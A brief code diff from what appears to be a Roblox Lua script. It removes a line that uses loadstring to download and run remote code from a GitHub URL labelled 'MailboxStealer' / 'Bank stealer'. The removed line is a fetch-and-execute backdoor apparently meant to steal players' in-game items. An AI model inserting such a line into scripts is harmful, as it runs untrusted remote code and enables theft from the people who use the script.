@@ -2064,5 +2064,3 @@ spawn(function()
         wait(1)
     end
 end)
-
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
